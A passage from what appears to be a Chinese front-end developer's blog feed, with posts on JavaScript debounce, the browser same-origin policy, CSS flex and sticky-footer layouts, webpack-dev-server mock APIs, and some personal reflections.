js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">debounce</span>(<span class="params">func, wait</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> timeout;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params">timeout</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> context = <span class="keyword">this</span>;</span><br><span class="line">    clearTimeout(timeout);</span><br><span class="line">    timeout = setTimeout(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">      func.apply(context);</span><br><span class="line">    &#125;, wait);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="event对象"><a href="#event对象" class="headerlink" title="event对象"></a>event对象</h3><p>JavaScript在事件处理函数中提供事件对象event；</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getAction</span>(<span class="params">e</span>)</span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(e);</span><br><span class="line">  container.innerHTML = count++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果我们不使用debounce函数，通过container.onmousemove调用，这里便会打印出MouseEvent对象<br><img src="http://www.chenqaq.com/assets/images/debounce3.png" alt="MouseEvent"></p><p>但是如果在通过debounce函数，却只会打印出undefined!让我们来改善一下debounce函数</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">debounce</span>(<span class="params">func, wait</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> timeout;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> context = <span class="keyword">this</span>;</span><br><span class="line">    <span class="keyword">var</span> args = <span class="built_in">arguments</span>;</span><br><span class="line"></span><br><span class="line">    clearTimeout(timeout)</span><br><span class="line">    timeout = setTimeout(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">      func.apply(context, args)</span><br><span class="line">    &#125;, wait);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>到此为止，在我们根据原理写的debounce的基础上，我们又解决了this指向和event对象的问题。</p><h3 id="立即执行"><a href="#立即执行" class="headerlink" title="立即执行"></a>立即执行</h3><p>这时候我们的代码已经很完善了，但是我们应该考虑到的一点是：<br>上面的代码我们总是需要等到事件停止触发n秒后。<br>我们想要的是：开始时候立即执行函数，然后等到停止触发n秒后，才可以重新触发执行。<br>我们加一个immediate参数判断是否立即执行。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">debounce</span>(<span class="params">func, wait, immediate</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> timeout, result;</span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> context = <span class="keyword">this</span>;</span><br><span class="line">    <span class="keyword">var</span> args = <span class="built_in">arguments</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (timeout) clearTimeout(timeout);</span><br><span class="line">    <span class="keyword">if</span> (immediate) &#123;</span><br><span class="line">      <span class="comment">// 如果已经执行过，不再执行</span></span><br><span class="line">      <span class="keyword">var</span> callNow = !timeout;</span><br><span class="line">      timeout = setTimeout(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        timeout = <span class="literal">null</span>;</span><br><span class="line">      &#125;, wait)</span><br><span class="line">      <span class="keyword">if</span> (callNow) result = func.apply(context, args);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      timeout = setTimeout(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        func.apply(context, args);</span><br><span class="line">      &#125;, wait);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="取消"><a href="#取消" class="headerlink" title="取消"></a>取消</h3><p>最后我们希望能够取消debounce函数，比如我们的debounce函数的时间间隔是10秒钟，immediate为true，这样的话，我们只有等待10s后才可以触发事件，所以我希望能有一个按钮能够取消防抖，这样再去触发，就可以又立刻执行啦。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">debounce</span>(<span class="params">func, wait, immediate</span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> timeout, result;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> debounced = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> context = <span class="keyword">this</span>;</span><br><span class="line">        <span class="keyword">var</span> args = <span class="built_in">arguments</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (timeout) clearTimeout(timeout);</span><br><span class="line">        <span class="keyword">if</span> (immediate) &#123;</span><br><span class="line">            <span class="comment">// 如果已经执行过，不再执行</span></span><br><span class="line">            <span class="keyword">var</span> callNow = !timeout;</span><br><span class="line">            timeout = setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                timeout = <span class="literal">null</span>;</span><br><span class="line">            &#125;, wait)</span><br><span class="line">            <span class="keyword">if</span> (callNow) result = func.apply(context, args)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            timeout = setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                func.apply(context, args)</span><br><span class="line">            &#125;, wait);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    debounced.cancel = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        clearTimeout(timeout);</span><br><span class="line">        timeout = <span class="literal">null</span>;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> debounced;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们如何使用cancel函数呢？依然以上面的demo为例</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="meta">'use strict'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> count = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">let</span> container = <span class="built_in">document</span>.getElementById(<span class="string">'container'</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getAction</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  container.innerHTML++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> setAction = debounce(getAction,<span class="number">10000</span>,<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">container.onmousemove = setAction;</span><br><span class="line"></span><br><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">"button"</span>).addEventListener(<span class="string">'click'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  setAction.cancel();</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>效果演示如下：<br><img src="http://www.chenqaq.com/assets/images/debounce3.gif" alt="debounce cancel"></p>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浏览器同源政策</title>
      <link href="/2018/03/15/cross-domain-cors/"/>
      <url>/2018/03/15/cross-domain-cors/</url>
      
        <content type="html"><![CDATA[<p>我们都知道浏览器的“同源政策”是浏览器安全的基石，根本目的是为了保护用户信息安全，防止恶意的网站窃取数据。<br>1995年，同源政策由Netscape 公司引入。目前，所有浏览器都执行这个政策。</p><a id="more"></a><p>随着互联网的发展，保障用户的信息安全也越来越重要。非同源将受到三种行为的限制：</p><blockquote><ul><li>Cookie、localstorage、IndexDB无法读取</li></ul></blockquote><ul><li>DOM无法获得</li><li>AJAX无法发送</li></ul><p>所谓”同源”即指三个相同，</p><blockquote><ul><li>域名相同</li></ul></blockquote><ul><li>协议相同</li><li>端口相同</li></ul><p>举个栗子，<a href="http://www.chenqaq.com我的网址，协议就是http://,域名是www.chenqaq.com，端口默认为80。" target="_blank" rel="noopener">http://www.chenqaq.com我的网址，协议就是http://,域名是www.chenqaq.com，端口默认为80。</a></p><p>ing…</p>]]></content>
      
      
      <categories>
          
          <category> WEB安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WEB安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>拥抱未来的布局方式</title>
      <link href="/2018/03/07/css-layout-flex-grid/"/>
      <url>/2018/03/07/css-layout-flex-grid/</url>
      
        <content type="html"><![CDATA[<p>相比传统的布局方式，flex 和 grid 使布局系统简化，轻松的解决了复杂的 web 布局。<br>早在以前，所有的 HTML 布局还是通过 table，float 以及其他 css 属性来完成。面对复杂的布局，就没有很好的办法了。<br>随着 flexbox 的出现，它专注于创建稳健的响应式页面布局模式，并轻松的正确对齐元素及其内容。如今已是我们的首选。</p><a id="more"></a><p><a href="https://caniuse.com/#feat=flexbox" target="_blank" rel="noopener">Can I Use FlexBox?</a></p><p><img src="http://www.chenqaq.com/assets/images/css-layout-flex1.png" alt=""></p><p>如今 flexbox 随着浏览器的发展（IE9 以下版本渐渐退出舞台），flexbox 如火如荼成为了 css 布局的主流，前端开发者的首选。</p><p>与此同时，grid 布局在 2010 年由 Microsoft 首次提出，目前已成为 W3C 候选标准，支持 grid 布局的浏览器也越来越多</p><p><a href="https://caniuse.com/#feat=css-grid" target="_blank" rel="noopener">Can I Use Grid?</a></p><p><img src="http://www.chenqaq.com/assets/images/css-layout-grid1.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> HTML/CSS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSS </tag>
            
            <tag> Layout </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>stricky footer的三种解决方案</title>
      <link href="/2018/02/01/css-layout-strickyFooter/"/>
      <url>/2018/02/01/css-layout-strickyFooter/</url>
      
        <content type="html"><![CDATA[<h1 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h1><p>stricky footer设计是最古老和最常见的效果之一，我们都曾经历过类似的情景：</p><blockquote><p>如果页面内容不够长的时候，页脚块粘贴在底部；如果内容足够长时，页脚块会被内容向下推送。</p></blockquote><a id="more"></a><p>这些天做vue+express实战的练习，跟着黄轶老师倒是认识了stricky footer，就认真的了解学习了一下，但是前两天的问题，今天几种解决方案的详细情况竟然有些模糊，所以还是记录下来吧！求学之路就是这样，不断地积累和重复。</p><p><img src="http://www.chenqaq.com/assets/images/strickyFooter1.png" alt=""></p><p>上图底部的<code>x</code>就用到了经典的stricky footer，当页面内容足够时，它会向下推送；当页面内容没有撑满整个屏幕时，它就固定在底部。</p><p>而不是像下图这样：</p><p><img src="http://www.chenqaq.com/assets/images/strickyFooter2.png" alt=""></p><h1 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h1><p>如果此前不知道stricky footer，使用fixed固定在底部的话，像下图这样</p><p><img src="http://www.chenqaq.com/assets/images/strickyFooter3.png" alt=""></p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">position</span>: <span class="selector-tag">fixed</span>;</span><br><span class="line"><span class="selector-tag">width</span>: 32<span class="selector-tag">px</span>;</span><br><span class="line"><span class="selector-tag">height</span>: 32<span class="selector-tag">px</span>;</span><br><span class="line"><span class="selector-tag">bottom</span>: 20<span class="selector-tag">px</span>;</span><br><span class="line"><span class="selector-tag">left</span>: <span class="selector-tag">calc</span>(50% <span class="selector-tag">-</span> 16<span class="selector-tag">px</span>);</span><br><span class="line"><span class="selector-tag">font-size</span>: 32<span class="selector-tag">px</span>;</span><br></pre></td></tr></table></figure><p>那样 <code>x</code> 会覆盖内容，显然是不符合要求的不实际的，而且不美观的。</p><p>所以经典的stricky footer 广为所用，适用情景也非常多，前几天回顾第一次做的项目，发现很多地方适用。</p><h1 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h1><p>stricky footer主要有三种解决方案，我们构建一点简单的代码</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"content"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"footer"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="1-为内容区域添加最小的高度"><a href="#1-为内容区域添加最小的高度" class="headerlink" title="1.为内容区域添加最小的高度"></a>1.为内容区域添加最小的高度</h2><p>这个方法主要是用视口vh来计算整体视窗的高度，然后减去底部footer的高度，从而得出内容区域的最小高度</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.content</span>&#123;</span><br><span class="line">  <span class="attribute">min-height</span>:<span class="built_in">calc</span>(100vh - `footer的高度`);</span><br><span class="line">  <span class="attribute">box-sizing</span>:border-box;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这种方法很简单，但是如果页面的footer高度不同，每个页面都要重新计算一次，所以并不推荐</p><h2 id="2-使用flex布局"><a href="#2-使用flex布局" class="headerlink" title="2.使用flex布局"></a>2.使用flex布局</h2><p>flex布局如今在移动端布局可谓是占有一片天地，广为所用。</p><p>我们通常利用flex布局对视窗宽度进行分割，一侧是固定宽度，另一侧是自适应宽度。同样的，flex布局当然也可以对对视窗高度进行分割，footer的flex为0，这样flex获得其固有的高度；content的flex为1。这样它会充满除去footer的其余部分</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">body</span>&#123;</span><br><span class="line">  <span class="attribute">display</span>:flex;</span><br><span class="line">  <span class="attribute">flex-flow</span>:column;</span><br><span class="line">  <span class="attribute">min-height</span>:<span class="number">100vh</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.content</span>&#123;</span><br><span class="line">  <span class="attribute">flex</span>:<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.footer</span>&#123;</span><br><span class="line">  <span class="attribute">flex</span>:<span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这种方法较为推荐</p><h2 id="3-在content的外面添加一个wrapper层"><a href="#3-在content的外面添加一个wrapper层" class="headerlink" title="3.在content的外面添加一个wrapper层"></a>3.在content的外面添加一个wrapper层</h2><p>这种方法也是黄轶老师使用的方法，在content的外面添加一个wrapper层包裹</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"content-wrapper clearfix"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"content"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"footer"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这种做法为了保证兼容性，我们通常会在wrapper层上添加一个clearfix类，</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">html</span>,<span class="selector-tag">body</span>,<span class="selector-class">.content-wrapper</span>&#123;</span><br><span class="line">  <span class="attribute">height</span>:<span class="number">100%</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">body</span> &gt; <span class="selector-class">.content-wrapper</span>&#123;</span><br><span class="line">  <span class="attribute">height</span>:auto;</span><br><span class="line">  <span class="attribute">min-height</span>:<span class="number">100%</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.content</span>&#123;</span><br><span class="line">  <span class="attribute">padding-bottom</span>:<span class="number">150px</span> //与footer的高度相同</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.footer</span>&#123;</span><br><span class="line">  <span class="attribute">position</span>:relative;</span><br><span class="line">  margin-top:-150px; // -`footer高度`</span><br><span class="line">  <span class="selector-tag">height</span><span class="selector-pseudo">:150px</span>;</span><br><span class="line">  <span class="selector-tag">clear</span><span class="selector-pseudo">:both</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.clearfix</span>&#123;</span><br><span class="line">  <span class="attribute">display</span>:inline-block;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.clearfix</span>&#123;</span><br><span class="line">  <span class="attribute">content</span>:<span class="string">""</span>;</span><br><span class="line">  <span class="attribute">display</span>:block;</span><br><span class="line">  <span class="attribute">height</span>:<span class="number">0</span>;</span><br><span class="line">  <span class="attribute">clear</span>:both;</span><br><span class="line">  <span class="attribute">visibility</span>: hidden;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样就完成了stricky footer，这种方法也比较推荐，但是加入的代码有点多，而且改变了HTML结构。</p>]]></content>
      
      
      <categories>
          
          <category> HTML/CSS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSS </tag>
            
            <tag> layout </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2018年已经开始！</title>
      <link href="/2018/01/25/life-aboutLife-job/"/>
      <url>/2018/01/25/life-aboutLife-job/</url>
      
        <content type="html"><![CDATA[<h1 id="我的2017"><a href="#我的2017" class="headerlink" title="我的2017"></a>我的2017</h1><p>最近偶然想起来拿出大一下（2017年2月-3月）给「郑州百格教育」写过的手机端的官网，看了又看，想着如果用这一年的学习，来重做一次这个官网，我会怎么做？觉得自己这一年来应该是有了不小的进步吧！</p><p>关于2017年，太多我已经记不清，我觉得上天还是很眷顾我的，或者说我是幸运的，收到了一些邀请，但是始终都没有达到心中的目标。</p><a id="more"></a><h1 id="悄然来到的2018"><a href="#悄然来到的2018" class="headerlink" title="悄然来到的2018"></a>悄然来到的2018</h1><p>1月21号，我申请加入<a href="https://github.com/xitu/gold-miner" target="_blank" rel="noopener">掘金翻译计划</a>通过，并完成校对一篇文章<a href="https://juejin.im/post/5a676c33f265da3e5b32f43c" target="_blank" rel="noopener">Vue Devtools 4.0 有哪些新内容</a>，成为广大译者中的其中一员。这真是一个很棒的计划，有很多的译者，可以一起交流英语和技术。</p><p><img src="http://www.chenqaq.com/assets/images/life-0.jpg" alt=""></p><p>其实自己一直有一个编者梦，大学的第二个目标就是希望能够有机会成为一名签约技术小编。17年我也收到了一些邀请（比如慕课网手记，腾讯云+社区邀请），但是他们的”邀请”都不是我心中的目标，但是我也积极参与到他们当中。</p><p>直到昨天，我收到了「阿里巴巴新零售事业群」的面试邀请（邮件中说到，是在github上发现我），我知道，收到这封邮件的人何止以百来计量，新零售是阿里近两年提出并付诸实践的战略。</p><p>就这样我成为了广大收到邀约面试邮件的其中一员，无奈我只是一个大二在校生，面对「前端专家」这样的邀请，社招的流程，终归还是会落空。</p><p>《大学》中开篇说到：“大学之大，在明明德，在亲民，在止于至善”，大学是一个从半成熟走向成熟的过程，慢慢的变得稳重，遇到问题开始从容坦然的解决。</p><p>其实对于这次邀请我并不惊讶，我却很从容（回复邮件也尤为理智吧），我知道我很用心的在维护我的github和博客，我总是相信，机会总是会眷顾那些有准备并且等待被发现的人，事实证明我是对的。</p><p>阿里是我大学给自己定下的第三个目标（但是遗憾我只能失去这次邀请机会，不过我回复邮件并且得到了他们的认可，今天也收到了他们的回信），期待着我的2018。</p><p><img src="http://www.chenqaq.com/assets/images/life-3.jpg" alt=""></p><p>其实我很清楚收到邮件的人不在少数。但是就这样，我成为了身边同学称的“励志的人”。但是我却清晰的认识到自己所处的位置，这并不是不自信，反而是一种自信，我能拿下的，我定赴汤蹈火。但是对于我一个大二的在校生，何敢以专家称，面对前端浩如烟海的知识面，自当愿付出10年甚至20年的韶华去专研，面对日新月日的技术栈，稍有停留，怕追上你的不是千人。</p><p>《追风筝的人》中有一句话，相信很多有梦想的孩子，都喜欢这句话</p><p><code>For you, a thousand times over</code></p><p>就像你开始一眼看到这本书觉得它所描述的一定是天真无邪的孩童在明媚的阳光下无忧无虑的奔跑，但是不曾想这本书却描述一个情节跌宕起伏一个十九世纪七十年代的阿富汗富家少爷和仆人孩子之间的友谊，充满了悲伤的意味，阿米尔和哈桑牵动了读者的心。我们都在不断的追逐那风筝。你的2018一定是不轻松的，但是希望你捡起心中的美好，愿陌上花开，不负韶华。</p><p>2018开始了，或许和过去的2017年有些不太一样。</p><p><img src="http://www.chenqaq.com/assets/images/life-4.jpg" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> 岁言心语 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 岁言心语 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>webpack-dev-server</title>
      <link href="/2018/01/19/vueCl-exExpressDataMock-I-do-t-have-devServer/"/>
      <url>/2018/01/19/vueCl-exExpressDataMock-I-do-t-have-devServer/</url>
      
        <content type="html"><![CDATA[<p>我们想要给我们的mock data 找一个接口请求，原版配置在 dev-server.js ，新版的 vue-webpack-template 删除了dev-server.js，改用webpcak.dev.conf.js代替（具体更新见<a href="https://github.com/vuejs-templates/webpack/pull/975" target="_blank" rel="noopener">github：switch to webpack-dev-server</a>）</p><p><img src="http://www.chenqaq.com/assets/images/vuecli1.png" alt="switch to webpack-dev-server"></p><a id="more"></a><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// # webpack.dev.conf.js</span></span><br><span class="line"><span class="comment">// 在const portfinder = require('portfinder')添加我们需要的一些模块</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// node的开发框架express来简化操作</span></span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>)</span><br><span class="line"><span class="keyword">const</span> app = express()</span><br><span class="line"></span><br><span class="line"><span class="comment">// mock data</span></span><br><span class="line"><span class="keyword">const</span> appDate = <span class="built_in">require</span>(<span class="string">'../mock/data.json'</span>)</span><br><span class="line"><span class="keyword">const</span> seller = appDate.seller;</span><br><span class="line"><span class="keyword">const</span> goods = appDate.goods;</span><br><span class="line"><span class="keyword">const</span> ratings = appDate.ratings;</span><br></pre></td></tr></table></figure><p>1、get请求配置</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"># webpack.dev.conf.js</span><br><span class="line"><span class="comment">// 在devServer选项中添加以下内容</span></span><br><span class="line"></span><br><span class="line">before(app)&#123;</span><br><span class="line">  app.get(<span class="string">'/api/seller'</span>,(req,res)=&gt;&#123;</span><br><span class="line">    res.json(&#123;</span><br><span class="line">      errno : <span class="number">0</span>,</span><br><span class="line">      data : seller</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;)</span><br><span class="line">  app.get(<span class="string">'/api/goods/'</span>,(req,res)=&gt;&#123;</span><br><span class="line">    res.json(&#123;</span><br><span class="line">      errno : <span class="number">0</span>,</span><br><span class="line">      data : goods</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;)</span><br><span class="line">  app.get(<span class="string">'/api/ratings'</span>,(req,res)=&gt;&#123;</span><br><span class="line">    res.json(&#123;</span><br><span class="line">      errno : <span class="number">0</span>,</span><br><span class="line">      data : ratings</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关于<code>devServer.before()</code> webpack有很详细的解释，并且给出了一个例子，它提供了在服务器内部所有中间件之前执行的自定义中间件的能力，用它可以来自定义处理程序</p><p><img src="http://www.chenqaq.com/assets/images/webpack1.png" alt="devServer.before"></p><p>修改完配置之后，我们需要重新运行命令<code>npm run dev</code>重新编译即可</p><p>然后标题栏访问</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//localhost:8080/api/seller</span></span><br></pre></td></tr></table></figure><p><img src="http://www.chenqaq.com/assets/images/vuecli-json1.png" alt="api/seller"></p><p>同样的，我们访问</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//localhost:8080/api/goods</span></span><br><span class="line"><span class="comment">// 和</span></span><br><span class="line">http:<span class="comment">//localhost:8080/api/ratings</span></span><br></pre></td></tr></table></figure><p>同样得到了我们的mock data，哈哈，终于给我们的mock data找了一个接口</p><p>2、post请求配置</p><p>如果配置post请求，我们可以做一下配置</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// # webpack.dev.conf.js</span></span><br><span class="line">app.post(<span class="string">'/api/foods'</span>,(req,res)=&gt;&#123;</span><br><span class="line">  res.json(&#123;</span><br><span class="line">    errno : <span class="number">0</span>,</span><br><span class="line">    data : foods</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 在组件中</span></span><br><span class="line"><span class="comment">// # ..vue</span></span><br><span class="line">created()&#123;</span><br><span class="line">  <span class="keyword">this</span>.$http.post(<span class="string">'http://localhost:8080/api/foods'</span>).then(res)=&gt;&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(res)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样我们的<code>data mock</code>就有接口可以访问喽。</p>]]></content>
      
      
      <categories>
          
          <category> Node </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Express </tag>
            
            <tag> Webpack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>学校寒冬的清晨和深夜</title>
      <link href="/2018/01/10/life-aboutSchool-finalExam/"/>
      <url>/2018/01/10/life-aboutSchool-finalExam/</url>
      
        <content type="html"><![CDATA[<p>最近忙着期末考试前的复习，倒也不紧不慢，反而看到了学校不一样的风景。</p><p>行走匆忙的人，不一定是无心观赏两岸的风景，只是为了心中的彼岸</p><p><img src="http://www.chenqaq.com/assets/images/morning.jpg" alt="morning"></p><p><img src="http://www.chenqaq.com/assets/images/night.jpg" alt="night"></p><a id="more"></a>]]></content>
      
      
      <categories>
          
          <category> 岁言心语 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 岁言心语 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用async和enterproxy控制并发数量</title>
      <link href="/2017/12/31/async-enterproxy-control-concurrency-md/"/>
      <url>/2017/12/31/async-enterproxy-control-concurrency-md/</url>
      
        <content type="html"><![CDATA[<h1 id="聊聊并发与并行"><a href="#聊聊并发与并行" class="headerlink" title="聊聊并发与并行"></a>聊聊并发与并行</h1><p>并发我们经常提及之，不管是web server，app并发无处不在，操作系统中，指一个时间段中几个程序处于已经启动运行到完毕之间，且这几个程序都是在同一处理机上运行，并且任一个时间点只有一个程序在处理机上运行。很多网站都有并发连接数量的限制，所以当请求发送太快的时候会导致返回值为空或报错。更有甚者，有些网站可能因为你发出的并发连接数量过多而当你是在恶意请求，封掉你的ip。</p><a id="more"></a><p>相对于并发，并行可能陌生了不少，并行指一组程序按独立异步的速度执行，不等于时间上的重叠（同一个时刻发生），通过增加cpu核心来实现多个程序(任务)的同时进行。没错，并行做到了多任务的同时进行</p><h1 id="使用enterproxy控制并发数量"><a href="#使用enterproxy控制并发数量" class="headerlink" title="使用enterproxy控制并发数量"></a>使用enterproxy控制并发数量</h1><p>enterproxy是朴灵大大为主要贡献的工具，带来一种事件式编程的思维变化，利用事件机制解耦复杂业务逻辑，解决了回调函数耦合性的诟病，将串行等待变成并行等待，提升多异步协作场景下的执行效率</p><p>我们如何使用enterproxy控制并发数量？通常如果我们不使用enterproxy和自制的计数器，我们如果抓取三个源：</p><p>这种深层嵌套，串行的方式</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">    <span class="keyword">var</span> render = <span class="function"><span class="keyword">function</span> (<span class="params">template, data</span>) </span>&#123;</span><br><span class="line">    _.template(template, data);</span><br><span class="line">    &#125;;</span><br><span class="line">$.<span class="keyword">get</span>("template", function (template) &#123;</span><br><span class="line">  <span class="comment">// something</span></span><br><span class="line">  $.<span class="keyword">get</span>("data", function (data) &#123;</span><br><span class="line">    <span class="comment">// something</span></span><br><span class="line">    $.<span class="keyword">get</span>("l10n", function (l10n) &#123;</span><br><span class="line">      <span class="comment">// something</span></span><br><span class="line">      render(template, data, l10n);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>除去这种过去深层嵌套的方法，我们常规的写法的自己维护一个计数器</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">var</span> result  = &#123;&#125;;</span><br><span class="line">    </span><br><span class="line">    $.<span class="keyword">get</span>('template',function(data)&#123;</span><br><span class="line">        result.data1 = data;</span><br><span class="line">        count++;</span><br><span class="line">        handle();</span><br><span class="line">    &#125;)</span><br><span class="line">    